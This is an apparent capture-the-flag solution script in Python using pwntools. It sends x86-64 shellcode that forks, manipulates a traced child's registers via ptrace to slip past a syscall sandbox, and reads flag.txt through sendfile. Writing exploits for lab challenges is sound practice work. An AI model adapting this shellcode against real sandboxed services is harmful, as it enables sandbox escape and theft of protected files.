#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./chall")

context.binary = exe

DOCKER_PORT = 1337
REMOTE_NC_CMD    = "nc localhost 444"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode child
set follow-exec-mode same
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    if args.DOCKER:
        return remote("localhost", DOCKER_PORT)
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    PTRACE_CONT = 7
    PTRACE_GETREGS = 12
    PTRACE_SETREGS = 13
    PTRACE_SYSCALL = 24
    RIP_OFFSET = 8*16

    shellcode = asm(f"""
        mov eax, SYS_fork
        syscall
        test eax, eax
        jz child

        mov r13, rax
                    
        mov eax, SYS_wait4
        mov rdi, r13
        xor esi, esi
        xor edx, edx
        xor r10, r10
        syscall
                                        
        mov eax, SYS_ptrace
        mov edi, {PTRACE_SYSCALL}
        mov rsi, r13
        xor edx, edx
        xor r10, r10
        syscall
        
        mov eax, SYS_wait4
        mov rdi, r13
        xor esi, esi
        xor edx, edx
        xor r10, r10
        syscall
                                        
        mov eax, SYS_ptrace
        mov edi, {PTRACE_GETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp
        syscall

        mov rdi, 0x820000000000
        lea rbx, [rsp+{RIP_OFFSET}]
        mov [rbx], rdi
        mov eax, SYS_ptrace
        mov edi, {PTRACE_SETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp
        syscall
                    
        mov eax, SYS_ptrace
        mov edi, {PTRACE_CONT}
        mov rsi, r13
        xor edx, edx
        xor r10, r10
        syscall
                      
        mov eax, SYS_wait4
        mov rdi, r13
        mov rsi, rsp
        xor edx, edx
        xor r10, r10
        syscall
                                        
        mov eax, SYS_ptrace
        mov edi, {PTRACE_GETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp
        syscall
                                                                                                     
        lea rdi, [rip+sendfile] 
        lea rbx, [rsp+{RIP_OFFSET}]
        mov [rbx], rdi
        mov eax, SYS_ptrace
        mov edi, {PTRACE_SETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp
        syscall
       
        mov eax, SYS_ptrace
        mov edi, {PTRACE_SYSCALL}
        mov rsi, r13
        xor edx, edx
        xor r10, r10
        syscall
                    
        mov eax, SYS_wait4
        mov rdi, r13
        xor esi, esi
        xor edx, edx
        xor r10, r10
        syscall
                                        
        mov eax, SYS_ptrace
        mov edi, {PTRACE_GETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp
        syscall
                 
        mov rdi, 0x820000000000
        lea rbx, [rsp+{RIP_OFFSET}]
        mov [rbx], rdi
        mov eax, SYS_ptrace
        mov edi, {PTRACE_SETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp
        syscall
                    
        mov eax, SYS_ptrace
        mov edi, {PTRACE_CONT}
        mov rsi, r13
        xor edx, edx
        xor r10, r10
        syscall
                    
        mov eax, SYS_wait4
        mov rdi, r13
        xor esi, esi
        xor edx, edx
        xor r10, r10
        syscall
        
        hlt

        child:
            mov eax, SYS_ptrace
            xor edi, edi
            xor esi, esi
            xor edx, edx
            xor r10, r10
            syscall
            int3
        open:
            mov eax, SYS_open
            lea rdi, [rip+flag]
            xor esi, esi
            xor edx, edx    
            syscall
        sendfile:
            mov rax, SYS_sendfile
            mov rdi, 1
            mov rsi, 3  
            xor edx, edx
            mov r10, 0x50
            syscall
        hlt
    flag:
    """) + b"flag.txt\0"

    r.sendline(bstr(len(shellcode)))
    r.send(shellcode)

    r.interactive()

if __name__ == "__main__":
    main()